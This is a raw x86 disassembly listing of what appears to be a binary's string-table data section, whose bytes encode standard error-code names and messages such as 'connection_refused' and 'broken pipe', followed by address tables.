  4016fd:	add    BYTE PTR fs:[eax],al
  401700:	arpl   WORD PTR [edi+0x6e],bp
  401703:	outs   dx,BYTE PTR ds:[esi]
  401704:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  401709:	outs   dx,BYTE PTR ds:[esi]
  40170a:	pop    edi
  40170b:	jb     0x401772
  40170d:	data16 jne 0x401783
  401710:	gs add BYTE PTR fs:[eax],al
  401714:	arpl   WORD PTR [edi+0x6e],bp
  401717:	outs   dx,BYTE PTR ds:[esi]
  401718:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40171d:	outs   dx,BYTE PTR ds:[esi]
  40171e:	pop    edi
  40171f:	jb     0x401786
  401721:	jae    0x401788
  401723:	je     0x401725
  401725:	add    BYTE PTR [eax],al
  401727:	add    BYTE PTR [ebp+eiz*2+0x73],ah
  40172b:	je     0x401796
  40172d:	outs   dx,BYTE PTR ds:[esi]
  40172e:	popa   
  40172f:	je     0x40179a
  401731:	outs   dx,DWORD PTR ds:[esi]
  401732:	outs   dx,BYTE PTR ds:[esi]
  401733:	pop    edi
  401734:	popa   
  401735:	fs fs jb 0x40179e
  401739:	jae    0x4017ae
  40173b:	pop    edi
  40173c:	jb     0x4017a3
  40173e:	jno    0x4017b5
  401740:	imul   esi,DWORD PTR [edx+0x65],0x64
  401747:	add    BYTE PTR [edx+0x61],ah
  40174a:	fs pop edi
  40174c:	popa   
  40174d:	fs fs jb 0x4017b6
  401751:	jae    0x4017c6
  401753:	add    BYTE PTR [eax+0x6f],ch
  401756:	jae    0x4017cc
  401758:	pop    edi
  401759:	jne    0x4017c9
  40175b:	jb     0x4017c2
  40175d:	popa   
  40175e:	arpl   WORD PTR [eax+0x61],bp
  401761:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  401765:	add    BYTE PTR [eax],al
  401767:	add    BYTE PTR [edi+0x70],ch
  40176a:	gs jb  0x4017ce
  40176d:	je     0x4017d8
  40176f:	outs   dx,DWORD PTR ds:[esi]
  401770:	outs   dx,BYTE PTR ds:[esi]
  401771:	pop    edi
  401772:	imul   ebp,DWORD PTR [esi+0x5f],0x676f7270
  401779:	jb     0x4017e0
  40177b:	jae    0x4017f0
  40177d:	add    BYTE PTR [eax],al
  40177f:	add    BYTE PTR [ecx+0x6e],ch
  401782:	je     0x4017e9
  401784:	jb     0x4017f8
  401786:	jne    0x4017f8
  401788:	je     0x4017ef
  40178a:	add    BYTE PTR fs:[ecx+0x6e],ch
  40178e:	jbe    0x4017f1
  401790:	ins    BYTE PTR es:[edi],dx
  401791:	imul   esp,DWORD PTR [edi+ebx*2+0x61],0x6d756772
  401799:	outs   dx,BYTE PTR gs:[esi]
  40179b:	je     0x40179d
  40179d:	add    BYTE PTR [eax],al
  40179f:	add    BYTE PTR [ecx+0x6c],ah
  4017a2:	jb     0x401809
  4017a4:	popa   
  4017a5:	fs jns 0x401807
  4017a8:	arpl   WORD PTR [edi+0x6e],bp
  4017ab:	outs   dx,BYTE PTR ds:[esi]
  4017ac:	arpl   WORD PTR gs:[ebp+eiz*2+0x64],si
  4017b1:	add    BYTE PTR [eax],al
  4017b3:	add    BYTE PTR [edi+ebp*2+0x6f],dh
  4017b7:	pop    edi
  4017b8:	ins    DWORD PTR es:[edi],dx
  4017b9:	popa   
  4017ba:	outs   dx,BYTE PTR ds:[esi]
  4017bb:	jns    0x40181c
  4017bd:	imul   bp,WORD PTR [ebp+eiz*2+0x73],0x6f5f
  4017c4:	jo     0x40182b
  4017c6:	outs   dx,BYTE PTR ds:[esi]
  4017c7:	add    BYTE PTR [ebp+0x65],ch
  4017ca:	jae    0x40183f
  4017cc:	popa   
  4017cd:	addr16 gs pop edi
  4017d0:	jae    0x40183b
  4017d2:	jp     0x401839
  4017d4:	add    BYTE PTR [eax],al
  4017d6:	add    BYTE PTR [eax],al
  4017d8:	imul   bp,WORD PTR [ebp+eiz*2+0x6e],0x6d61
  4017df:	gs pop edi
  4017e1:	je     0x401852
  4017e3:	outs   dx,DWORD PTR ds:[esi]
  4017e4:	pop    edi
  4017e5:	ins    BYTE PTR es:[edi],dx
  4017e6:	outs   dx,DWORD PTR ds:[esi]
  4017e7:	outs   dx,BYTE PTR ds:[esi]
  4017e8:	add    BYTE PTR [bx+si],al
  4017eb:	add    BYTE PTR [esi+0x65],ch
  4017ee:	je     0x401867
  4017f0:	outs   dx,DWORD PTR ds:[esi]
  4017f1:	jb     0x40185e
  4017f3:	pop    edi
  4017f4:	outs   dx,DWORD PTR fs:[esi]
  4017f6:	ja     0x401866
  4017f8:	add    BYTE PTR [eax],al
  4017fa:	add    BYTE PTR [eax],al
  4017fc:	outs   dx,BYTE PTR ds:[esi]
  4017fd:	gs je  0x401877
  401800:	outs   dx,DWORD PTR ds:[esi]
  401801:	jb     0x40186e
  401803:	pop    edi
  401804:	jb     0x40186b
  401806:	jae    0x40186d
  401808:	je     0x40180a
  40180a:	add    BYTE PTR [eax],al
  40180c:	outs   dx,BYTE PTR ds:[esi]
  40180d:	gs je  0x401887
  401810:	outs   dx,DWORD PTR ds:[esi]
  401811:	jb     0x40187e
  401813:	pop    edi
  401814:	jne    0x401884
  401816:	jb     0x40187d
  401818:	popa   
  401819:	arpl   WORD PTR [eax+0x61],bp
  40181c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  401820:	outs   dx,BYTE PTR ds:[esi]
  401821:	outs   dx,DWORD PTR ds:[esi]
  401822:	pop    edi
  401823:	bound  esi,QWORD PTR [ebp+0x66]
  401826:	data16 gs jb 0x401889
  40182a:	jae    0x40189c
  40182c:	popa   
  40182d:	arpl   WORD PTR [ebp+0x0],sp
  401830:	outs   dx,BYTE PTR ds:[esi]
  401831:	outs   dx,DWORD PTR ds:[esi]
  401832:	pop    edi
  401833:	jo     0x4018a7
  401835:	outs   dx,DWORD PTR ds:[esi]
  401836:	je     0x4018a7
  401838:	arpl   WORD PTR [edi+0x6c],bp
  40183b:	pop    edi
  40183c:	outs   dx,DWORD PTR ds:[esi]
  40183d:	jo     0x4018b3
  40183f:	imul   ebp,DWORD PTR [edi+0x6e],0x6f6e0000
  401846:	je     0x4018a7
  401848:	arpl   WORD PTR [edi+0x6e],bp
  40184b:	outs   dx,BYTE PTR ds:[esi]
  40184c:	arpl   WORD PTR gs:[ebp+eiz*2+0x64],si
  401851:	add    BYTE PTR [eax],al
  401853:	add    BYTE PTR [esi+0x6f],ch
  401856:	je     0x4018b7
  401858:	popa   
  401859:	pop    edi
  40185a:	jae    0x4018cb
  40185c:	arpl   WORD PTR [ebx+0x65],bp
  40185f:	je     0x401861
  401861:	add    BYTE PTR [eax],al
  401863:	add    BYTE PTR [edi+0x70],ch
  401866:	gs jb  0x4018ca
  401869:	je     0x4018d4
  40186b:	outs   dx,DWORD PTR ds:[esi]
  40186c:	outs   dx,BYTE PTR ds:[esi]
  40186d:	pop    edi
  40186e:	outs   dx,BYTE PTR ds:[esi]
  40186f:	outs   dx,DWORD PTR ds:[esi]
  401870:	je     0x4018d1
  401872:	jae    0x4018e9
  401874:	jo     0x4018e6
  401876:	outs   dx,DWORD PTR ds:[esi]
  401877:	jb     0x4018ed
  401879:	gs add BYTE PTR fs:[eax+0x72],dh
  40187e:	outs   dx,DWORD PTR ds:[esi]
  40187f:	je     0x4018f0
  401881:	arpl   WORD PTR [edi+0x6c],bp
  401884:	pop    edi
  401885:	outs   dx,BYTE PTR ds:[esi]
  401886:	outs   dx,DWORD PTR ds:[esi]
  401887:	je     0x4018e8
  401889:	jae    0x401900
  40188b:	jo     0x4018fd
  40188d:	outs   dx,DWORD PTR ds:[esi]
  40188e:	jb     0x401904
  401890:	gs add BYTE PTR fs:[eax],al
  401894:	ja     0x401908
  401896:	outs   dx,DWORD PTR ds:[esi]
  401897:	outs   dx,BYTE PTR ds:[esi]
  401898:	addr16 pop edi
  40189a:	jo     0x40190e
  40189c:	outs   dx,DWORD PTR ds:[esi]
  40189d:	je     0x40190e
  40189f:	arpl   WORD PTR [edi+0x6c],bp
  4018a2:	pop    edi
  4018a3:	je     0x40191e
  4018a5:	jo     0x40190c
  4018a7:	add    BYTE PTR [ecx+ebp*2+0x6d],dh
  4018ab:	gs fs pop edi
  4018ae:	outs   dx,DWORD PTR ds:[esi]
  4018af:	jne    0x401925
  4018b1:	add    BYTE PTR [eax],al
  4018b3:	add    BYTE PTR [edi+0x70],ch
  4018b6:	gs jb  0x40191a
  4018b9:	je     0x401924
  4018bb:	outs   dx,DWORD PTR ds:[esi]
  4018bc:	outs   dx,BYTE PTR ds:[esi]
  4018bd:	pop    edi
  4018be:	ja     0x40192f
  4018c0:	jne    0x40192e
  4018c2:	fs pop edi
  4018c4:	bound  ebp,QWORD PTR [edi+ebp*2+0x63]
  4018c8:	imul   eax,DWORD PTR [eax],0x0
  4018cb:	add    BYTE PTR [eax],al
  4018cd:	add    BYTE PTR [eax],al
  4018cf:	add    BYTE PTR [esi+0x0],ah
  4018d2:	add    BYTE PTR [eax],al
  4018d4:	dec    eax
  4018d5:	sbb    eax,DWORD PTR [eax+0x0]
  4018d8:	add    BYTE PTR fs:[eax],al
  4018db:	add    BYTE PTR [eax+0x1b],ch
  4018de:	inc    eax
  4018df:	add    BYTE PTR [ebp+0x0],ah
  4018e2:	add    BYTE PTR [eax],al
  4018e4:	js     0x401901
  4018e6:	inc    eax
  4018e7:	add    BYTE PTR [ecx+0x0],dh
  4018ea:	add    BYTE PTR [eax],al
  4018ec:	nop
  4018ed:	sbb    eax,DWORD PTR [eax+0x0]
  4018f0:	pop    es
  4018f1:	add    BYTE PTR [eax],al
  4018f3:	add    BYTE PTR [ebx+ebx*1+0x210040],ah
  4018fa:	add    BYTE PTR [eax],al
  4018fc:	mov    esp,0xe00401b
  401901:	add    BYTE PTR [eax],al
  401903:	add    ah,dl
  401905:	sbb    eax,DWORD PTR [eax+0x0]
  401908:	or     DWORD PTR [eax],eax
  40190a:	add    BYTE PTR [eax],al
  40190c:	loopne 0x401929
  40190e:	inc    eax
  40190f:	add    BYTE PTR [eax+0x0],ch
  401912:	add    BYTE PTR [eax],al
  401914:	hlt    
  401915:	sbb    eax,DWORD PTR [eax+0x0]
  401918:	and    BYTE PTR [eax],al
  40191a:	add    BYTE PTR [eax],al
  40191c:	add    BYTE PTR [eax+eax*2],bl
  40191f:	add    BYTE PTR [edx+0x0],ch
  401922:	add    BYTE PTR [eax],al
  401924:	or     al,0x1c
  401926:	inc    eax
  401927:	add    BYTE PTR [edi+0x0],ah
  40192a:	add    BYTE PTR [eax],al
  40192c:	and    BYTE PTR [eax+eax*2],bl
  40192f:	add    BYTE PTR [ebx+0x0],ch
  401932:	add    BYTE PTR [eax],al
  401934:	inc    eax
  401935:	sbb    al,0x40
  401937:	add    BYTE PTR [eax+eax*1+0x0],ch
  40193b:	add    BYTE PTR [esp+ebx*1+0x40],dl
  40193f:	add    BYTE PTR [edx],dl
  401941:	add    BYTE PTR [eax],al
  401943:	add    BYTE PTR [eax],ah
  401945:	push   ss
  401946:	inc    eax
  401947:	add    BYTE PTR [ebp+0x0],ch
  40194a:	add    BYTE PTR [eax],al
  40194c:	push   0x1000401c
  401951:	add    BYTE PTR [eax],al
  401953:	add    BYTE PTR [ebp+edx*1+0x40],al
  401957:	add    BYTE PTR [ecx],ch
  401959:	add    BYTE PTR [eax],al
  40195b:	add    BYTE PTR [eax+0x15],ch
  40195e:	inc    eax
  40195f:	add    BYTE PTR [eax],cl
  401961:	add    BYTE PTR [eax],al
  401963:	add    BYTE PTR [eax+0x1100401c],cl
  401969:	add    BYTE PTR [eax],al
  40196b:	add    BYTE PTR [edx*1+0x1b0040],dl
  401972:	add    BYTE PTR [eax],al
  401974:	mov    al,ds:0x2600401c
  401979:	add    BYTE PTR [eax],al
  40197b:	add    BYTE PTR [eax],dh
  40197d:	adc    eax,0x280040
  401982:	add    BYTE PTR [eax],al
  401984:	rcl    BYTE PTR ds:0x6e0040,0x0
  40198b:	add    BYTE PTR [eax+0x6f00401c],dh
  401991:	add    BYTE PTR [eax],al
  401993:	add    ah,al
  401995:	sbb    al,0x40
  401997:	add    BYTE PTR [edx],ch
  401999:	add    BYTE PTR [eax],al
  40199b:	add    al,bl
  40199d:	sbb    al,0x40
  40199f:	add    BYTE PTR [ecx],bl
  4019a1:	add    BYTE PTR [eax],al
  4019a3:	add    al,dh
  4019a5:	sbb    al,0x40
  4019a7:	add    BYTE PTR [eax+eax*1],al
  4019aa:	add    BYTE PTR [eax],al
  4019ac:	adc    BYTE PTR [edi],0x40
  4019af:	add    BYTE PTR [esi],dl
  4019b1:	add    BYTE PTR [eax],al
  4019b3:	add    BYTE PTR [ebp+edx*1+0x40],bh
  4019b7:	add    BYTE PTR ds:0x14000000,bl
  4019bd:	sbb    eax,0x50040
  4019c2:	add    BYTE PTR [eax],al
  4019c4:	pop    esp
  4019c5:	adc    eax,0x150040
  4019ca:	add    BYTE PTR [eax],al
  4019cc:	and    al,0x1d
  4019ce:	inc    eax
  4019cf:	add    BYTE PTR [ebx+0x0],dh
  4019d2:	add    BYTE PTR [eax],al
  4019d4:	xor    al,0x1d
  4019d6:	inc    eax
  4019d7:	add    BYTE PTR [eax+eax*1+0x0],dh
  4019db:	add    BYTE PTR [ebp+ebx*1+0x40],al
  4019df:	add    BYTE PTR [ebp+0x0],dh
  4019e2:	add    BYTE PTR [eax],al
  4019e4:	push   esp
  4019e5:	sbb    eax,0x760040
  4019ea:	add    BYTE PTR [eax],al
  4019ec:	fs sbb eax,0x770040
  4019f2:	add    BYTE PTR [eax],al
  4019f4:	js     0x401a13
  4019f6:	inc    eax
  4019f7:	add    BYTE PTR [edx],cl
  4019f9:	add    BYTE PTR [eax],al
  4019fb:	add    BYTE PTR [eax+0x7900401d],cl
  401a01:	add    BYTE PTR [eax],al
  401a03:	add    BYTE PTR [ebp+ebx*1+0x270040],bl
  401a0a:	add    BYTE PTR [eax],al
  401a0c:	fcom   DWORD PTR ds:0x780040
  401a12:	add    BYTE PTR [eax],al
  401a14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a15:	sbb    eax,0x7a0040
  401a1a:	add    BYTE PTR [eax],al
  401a1c:	mov    esp,0x7b00401d
  401a21:	add    BYTE PTR [eax],al
  401a23:	add    al,cl
  401a25:	sbb    eax,0x1c0040
  401a2a:	add    BYTE PTR [eax],al
  401a2c:	nop
  401a2d:	adc    eax,0x7c0040
  401a32:	add    BYTE PTR [eax],al
  401a34:	fcomp  QWORD PTR ds:0x60040
  401a3a:	add    BYTE PTR [eax],al
  401a3c:	lock sbb eax,0x130040
  401a42:	add    BYTE PTR [eax],al
  401a44:	and    BYTE PTR ds:0x20040,dl
  401a4a:	add    BYTE PTR [eax],al
  401a4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a4d:	adc    eax,0x30040
  401a52:	add    BYTE PTR [eax],al
  401a54:	or     al,0x1e
  401a56:	inc    eax
  401a57:	add    BYTE PTR [eax+eax*1],dl
  401a5a:	add    BYTE PTR [eax],al
  401a5c:	sbb    al,0x1e
  401a5e:	inc    eax
  401a5f:	add    BYTE PTR [eax+0x2c000000],al
  401a65:	push   ds
  401a66:	inc    eax
  401a67:	add    BYTE PTR [ebp+0x0],bh
  401a6a:	add    BYTE PTR [eax],al
  401a6c:	cmp    al,0x1e
  401a6e:	inc    eax
  401a6f:	add    BYTE PTR [esi+0x0],bh
  401a72:	add    BYTE PTR [eax],al
  401a74:	dec    esp
  401a75:	push   ds
  401a76:	inc    eax
  401a77:	add    BYTE PTR [eax+eax*1],cl
  401a7a:	add    BYTE PTR [eax],al
  401a7c:	in     al,dx
  401a7d:	adc    eax,0x810040
  401a82:	add    BYTE PTR [eax],al
  401a84:	pop    esp
  401a85:	push   ds
  401a86:	inc    eax
  401a87:	add    BYTE PTR [ecx+0x0],ch
  401a8a:	add    BYTE PTR [eax],al
  401a8c:	xor    al,0x16
  401a8e:	inc    eax
  401a8f:	add    BYTE PTR [eax+0x0],dh
  401a92:	add    BYTE PTR [eax],al
  401a94:	ins    BYTE PTR es:[edi],dx
  401a95:	push   ds
  401a96:	inc    eax
  401a97:	add    BYTE PTR [ecx],al
  401a99:	add    BYTE PTR [eax],al
  401a9b:	add    BYTE PTR [esi+ebx*1+0x820040],al
  401aa2:	add    BYTE PTR [eax],al
  401aa4:	pushf  
  401aa5:	push   ds
  401aa6:	inc    eax
  401aa7:	add    BYTE PTR [eax+eax*1+0x1eb40000],cl
  401aae:	inc    eax
  401aaf:	add    BYTE PTR [ebp-0x34000000],al
  401ab5:	push   ds
  401ab6:	inc    eax
  401ab7:	add    BYTE PTR ds:0x0,cl
  401abd:	adc    eax,0x860040
  401ac2:	add    BYTE PTR [eax],al
  401ac4:	fcomp  DWORD PTR [esi]
  401ac6:	inc    eax
  401ac7:	add    BYTE PTR [edi-0x18000000],al
  401acd:	push   ds
  401ace:	inc    eax
  401acf:	add    BYTE PTR [esi],bl
  401ad1:	add    BYTE PTR [eax],al
  401ad3:	add    BYTE PTR [eax],al
  401ad5:	pop    ds
  401ad6:	inc    eax
  401ad7:	add    BYTE PTR [eax+eax*1],ah
  401ada:	add    BYTE PTR [eax],al
  401adc:	sbb    BYTE PTR [edi],bl
  401ade:	inc    eax
  401adf:	add    BYTE PTR [ebx],cl
  401ae1:	add    BYTE PTR [eax],al
  401ae3:	add    BYTE PTR [eax],al
  401ae5:	push   ss
  401ae6:	inc    eax
  401ae7:	add    BYTE PTR [edx],ah
  401ae9:	add    BYTE PTR [eax],al
  401aeb:	add    BYTE PTR [eax],bh
  401aed:	pop    ds
  401aee:	inc    eax
  401aef:	add    BYTE PTR [edi+0x0],bh
  401af2:	add    BYTE PTR [eax],al
  401af4:	dec    esp
  401af5:	pop    ds
  401af6:	inc    eax
  401af7:	add    BYTE PTR [ecx+0x64000000],cl
  401afd:	pop    ds
  401afe:	inc    eax
  401aff:	add    BYTE PTR [ebx+0x74000000],cl
  401b05:	pop    ds
  401b06:	inc    eax
  401b07:	add    BYTE PTR [edx-0x7c000000],cl
  401b0d:	pop    ds
  401b0e:	inc    eax
  401b0f:	add    BYTE PTR [edi],dl
  401b11:	add    BYTE PTR [eax],al
  401b13:	add    BYTE PTR [eax+0x1800401f],dl
  401b19:	add    BYTE PTR [eax],al
  401b1b:	add    BYTE PTR [eax+0x16],cl
  401b1e:	inc    eax
  401b1f:	add    BYTE PTR [edi],bl
  401b21:	add    BYTE PTR [eax],al
  401b23:	add    BYTE PTR [eax+0x7200401f],dh
  401b29:	add    BYTE PTR [eax],al
  401b2b:	add    al,al
  401b2d:	pop    ds
  401b2e:	inc    eax
  401b2f:	add    BYTE PTR [eax+eax*1+0x1fe00000],al
  401b36:	inc    eax
  401b37:	add    BYTE PTR [eax-0x10000000],cl
  401b3d:	pop    ds
  401b3e:	inc    eax
	...
  401b47:	add    BYTE PTR [ecx+0x64],ah
  401b4a:	fs jb  0x401bb2
  401b4d:	jae    0x401bc2
  401b4f:	and    BYTE PTR [esi+0x61],ah
  401b52:	ins    DWORD PTR es:[edi],dx
  401b53:	imul   ebp,DWORD PTR [ecx+edi*2+0x20],0x20746f6e
  401b5b:	jae    0x401bd2
  401b5d:	jo     0x401bcf
  401b5f:	outs   dx,DWORD PTR ds:[esi]
  401b60:	jb     0x401bd6
  401b62:	gs add BYTE PTR fs:[eax],al
  401b66:	add    BYTE PTR [eax],al
  401b68:	popa   
  401b69:	fs fs jb 0x401bd2
  401b6d:	jae    0x401be2
  401b6f:	and    BYTE PTR [ecx+0x6e],ch
  401b72:	and    BYTE PTR [ebp+0x73],dh
  401b75:	add    BYTE PTR gs:[eax],al
  401b78:	popa   
  401b79:	fs fs jb 0x401be2
  401b7d:	jae    0x401bf2
  401b7f:	and    BYTE PTR [esi+0x6f],ch
  401b82:	je     0x401ba4
  401b84:	popa   
  401b85:	jbe    0x401be8
  401b87:	imul   ebp,DWORD PTR [ecx+eiz*2+0x62],0x656c
  401b8f:	add    BYTE PTR [ecx+0x6c],ah
  401b92:	jb     0x401bf9
  401b94:	popa   
  401b95:	fs jns 0x401bb8
  401b98:	arpl   WORD PTR [edi+0x6e],bp
  401b9b:	outs   dx,BYTE PTR ds:[esi]
  401b9c:	arpl   WORD PTR gs:[ebp+eiz*2+0x64],si
  401ba1:	add    BYTE PTR [eax],al
  401ba3:	add    BYTE PTR [ecx+0x72],ah
  401ba6:	addr16 jne 0x401c16
  401ba9:	outs   dx,BYTE PTR gs:[esi]
  401bab:	je     0x401bcd
  401bad:	ins    BYTE PTR es:[edi],dx
  401bae:	imul   esi,DWORD PTR [ebx+0x74],0x6f6f7420
  401bb5:	and    BYTE PTR [edi+ebp*2+0x6e],ch
  401bb9:	add    BYTE PTR [bx+si],al
  401bbc:	popa   
  401bbd:	jb     0x401c26
  401bbf:	jne    0x401c2e
  401bc1:	outs   dx,BYTE PTR gs:[esi]
  401bc3:	je     0x401be5
  401bc5:	outs   dx,DWORD PTR ds:[esi]
  401bc6:	jne    0x401c3c
  401bc8:	and    BYTE PTR [edi+0x66],ch
  401bcb:	and    BYTE PTR [edi+ebp*2+0x6d],ah
  401bcf:	popa   
  401bd0:	imul   ebp,DWORD PTR [esi+0x0],0x64616200
  401bd7:	and    BYTE PTR [ecx+0x64],ah
  401bda:	fs jb  0x401c42
  401bdd:	jae    0x401c52
  401bdf:	add    BYTE PTR [edx+0x61],ah
  401be2:	and    BYTE PTR fs:[esi+0x69],ah
  401be6:	ins    BYTE PTR es:[edi],dx
  401be7:	and    BYTE PTR gs:[ebp+eiz*2+0x73],ah
  401bec:	arpl   WORD PTR [edx+0x69],si
  401bef:	jo     0x401c65
  401bf1:	outs   dx,DWORD PTR ds:[esi]
  401bf2:	jb     0x401bf4
  401bf4:	bound  esp,QWORD PTR [ecx+0x64]
  401bf7:	and    BYTE PTR [ebp+0x65],ch
  401bfa:	jae    0x401c6f
  401bfc:	popa   
  401bfd:	add    BYTE PTR gs:[bp+si+0x72],ah
  401c02:	outs   dx,DWORD PTR ds:[esi]
  401c03:	imul   esp,DWORD PTR [ebp+0x6e],0x20
  401c07:	jo     0x401c72
  401c09:	jo     0x401c70
  401c0b:	add    BYTE PTR [ebx+0x6f],ah
  401c0e:	outs   dx,BYTE PTR ds:[esi]
  401c0f:	outs   dx,BYTE PTR ds:[esi]
  401c10:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  401c15:	outs   dx,BYTE PTR ds:[esi]
  401c16:	and    BYTE PTR [ecx+0x62],ah
  401c19:	outs   dx,DWORD PTR ds:[esi]
  401c1a:	jb     0x401c90
  401c1c:	gs add BYTE PTR fs:[eax],al
  401c20:	arpl   WORD PTR [edi+0x6e],bp
  401c23:	outs   dx,BYTE PTR ds:[esi]
  401c24:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  401c29:	outs   dx,BYTE PTR ds:[esi]
  401c2a:	and    BYTE PTR [ecx+0x6c],ah
  401c2d:	jb     0x401c94
  401c2f:	popa   
  401c30:	fs jns 0x401c53
  401c33:	imul   ebp,DWORD PTR [esi+0x20],0x676f7270
  401c3a:	jb     0x401ca1
  401c3c:	jae    0x401cb1
  401c3e:	add    BYTE PTR [eax],al
  401c40:	arpl   WORD PTR [edi+0x6e],bp
  401c43:	outs   dx,BYTE PTR ds:[esi]
  401c44:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  401c49:	outs   dx,BYTE PTR ds:[esi]
  401c4a:	and    BYTE PTR [edx+0x65],dh
  401c4d:	data16 jne 0x401cc3
  401c50:	gs add BYTE PTR fs:[eax],al
  401c54:	arpl   WORD PTR [edi+0x6e],bp
  401c57:	outs   dx,BYTE PTR ds:[esi]
  401c58:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  401c5d:	outs   dx,BYTE PTR ds:[esi]
  401c5e:	and    BYTE PTR [edx+0x65],dh
  401c61:	jae    0x401cc8
  401c63:	je     0x401c65
  401c65:	add    BYTE PTR [eax],al
  401c67:	add    BYTE PTR [ebp+eiz*2+0x73],ah
  401c6b:	je     0x401cd6
  401c6d:	outs   dx,BYTE PTR ds:[esi]
  401c6e:	popa   
  401c6f:	je     0x401cda
  401c71:	outs   dx,DWORD PTR ds:[esi]
  401c72:	outs   dx,BYTE PTR ds:[esi]
  401c73:	and    BYTE PTR [ecx+0x64],ah
  401c76:	fs jb  0x401cde
  401c79:	jae    0x401cee
  401c7b:	and    BYTE PTR [edx+0x65],dh
  401c7e:	jno    0x401cf5
  401c80:	imul   esi,DWORD PTR [edx+0x65],0x64
  401c87:	add    BYTE PTR [ebp+0x78],ah
  401c8a:	arpl   WORD PTR gs:[ebp+0x74],si
  401c8e:	popa   
  401c8f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x20]
  401c93:	outs   dx,WORD PTR ds:[esi]
  401c95:	jb     0x401d04
  401c97:	popa   
  401c98:	je     0x401cba
  401c9a:	gs jb  0x401d0f
  401c9d:	outs   dx,DWORD PTR ds:[esi]
  401c9e:	jb     0x401ca0
  401ca0:	imul   bp,WORD PTR [ebp+eiz*2+0x20],0x6f74
  401ca7:	outs   dx,DWORD PTR ds:[esi]
  401ca8:	and    BYTE PTR [ecx+eiz*2+0x72],ch
  401cac:	add    BYTE PTR gs:[bx+si],al
  401cb0:	push   0x2074736f
  401cb5:	jne    0x401d25
  401cb7:	jb     0x401d1e
  401cb9:	popa   
  401cba:	arpl   WORD PTR [eax+0x61],bp
  401cbd:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  401cc1:	add    BYTE PTR [eax],al
  401cc3:	add    BYTE PTR [ecx+0x64],ch
  401cc6:	outs   dx,BYTE PTR gs:[esi]
  401cc8:	je     0x401d33
  401cca:	imul   sp,WORD PTR [ebp+0x72],0x7220
  401cd0:	gs ins DWORD PTR es:[edi],dx
  401cd2:	outs   dx,DWORD PTR ds:[esi]
  401cd3:	jbe    0x401d3a
  401cd5:	add    BYTE PTR fs:[eax],al
  401cd8:	imul   ebp,DWORD PTR [esp+ebp*2+0x65],0x206c6167
  401ce0:	bound  edi,QWORD PTR [ecx+0x74]
  401ce3:	and    BYTE PTR gs:[ebx+0x65],dh
  401ce7:	jno    0x401d5e
  401ce9:	outs   dx,BYTE PTR gs:[esi]
  401ceb:	arpl   WORD PTR [ebp+0x0],sp
  401cee:	add    BYTE PTR [eax],al
  401cf0:	imul   ebp,DWORD PTR [esi+0x61],0x6f727070
  401cf7:	jo     0x401d6b
  401cf9:	imul   esp,DWORD PTR [ecx+0x74],0x6f692065
  401d00:	and    BYTE PTR [ebx+0x6f],ah
  401d03:	outs   dx,BYTE PTR ds:[esi]
  401d04:	je     0x401d78
  401d06:	outs   dx,DWORD PTR ds:[esi]
  401d07:	ins    BYTE PTR es:[edi],dx
  401d08:	and    BYTE PTR [edi+0x70],ch
  401d0b:	gs jb  0x401d6f
  401d0e:	je     0x401d79
  401d10:	outs   dx,DWORD PTR ds:[esi]
  401d11:	outs   dx,BYTE PTR ds:[esi]
  401d12:	add    BYTE PTR [eax],al
  401d14:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
  401d1b:	and    BYTE PTR [ebx+0x65],dh
  401d1e:	imul   eax,DWORD PTR gs:[eax],0x0
  401d22:	add    BYTE PTR [eax],al
  401d24:	imul   esi,DWORD PTR [ebx+0x20],0x69642061
  401d2b:	jb     0x401d92
  401d2d:	arpl   WORD PTR [edi+ebp*2+0x72],si
  401d31:	jns    0x401d33
  401d33:	add    BYTE PTR [ebp+0x65],ch
  401d36:	jae    0x401dab
  401d38:	popa   
  401d39:	and    BYTE PTR gs:[bp+di+0x69],dh
  401d3e:	jp     0x401da5
  401d40:	add    BYTE PTR [eax],al
  401d42:	add    BYTE PTR [eax],al
  401d44:	outs   dx,BYTE PTR ds:[esi]
  401d45:	gs je  0x401dbf
  401d48:	outs   dx,DWORD PTR ds:[esi]
  401d49:	jb     0x401db6
  401d4b:	and    BYTE PTR [edi+ebp*2+0x77],ah
  401d4f:	outs   dx,BYTE PTR ds:[esi]
  401d50:	add    BYTE PTR [eax],al
  401d52:	add    BYTE PTR [eax],al
  401d54:	outs   dx,BYTE PTR ds:[esi]
  401d55:	gs je  0x401dcf
  401d58:	outs   dx,DWORD PTR ds:[esi]
  401d59:	jb     0x401dc6
  401d5b:	and    BYTE PTR [edx+0x65],dh
  401d5e:	jae    0x401dc5
  401d60:	je     0x401d62
  401d62:	add    BYTE PTR [eax],al
  401d64:	outs   dx,BYTE PTR ds:[esi]
  401d65:	gs je  0x401ddf
  401d68:	outs   dx,DWORD PTR ds:[esi]
  401d69:	jb     0x401dd6
  401d6b:	and    BYTE PTR [ebp+0x6e],dh
  401d6e:	jb     0x401dd5
  401d70:	popa   
  401d71:	arpl   WORD PTR [eax+0x61],bp
  401d74:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  401d78:	outs   dx,BYTE PTR ds:[esi]
  401d79:	outs   dx,DWORD PTR ds:[esi]
  401d7a:	and    BYTE PTR [edx+0x75],ah
  401d7d:	data16 data16 gs jb 0x401da2
  401d82:	jae    0x401df4
  401d84:	popa   
  401d85:	arpl   WORD PTR [ebp+0x0],sp
  401d88:	outs   dx,BYTE PTR ds:[esi]
  401d89:	outs   dx,DWORD PTR ds:[esi]
  401d8a:	and    BYTE PTR [ebx+0x68],ah
  401d8d:	imul   ebp,DWORD PTR [esp+eiz*2+0x20],0x636f7270
  401d95:	gs jae 0x401e0b
  401d98:	add    BYTE PTR [eax],al
  401d9a:	add    BYTE PTR [eax],al
  401d9c:	outs   dx,BYTE PTR ds:[esi]
  401d9d:	outs   dx,DWORD PTR ds:[esi]
  401d9e:	and    BYTE PTR [ecx+ebp*2+0x6e],ch
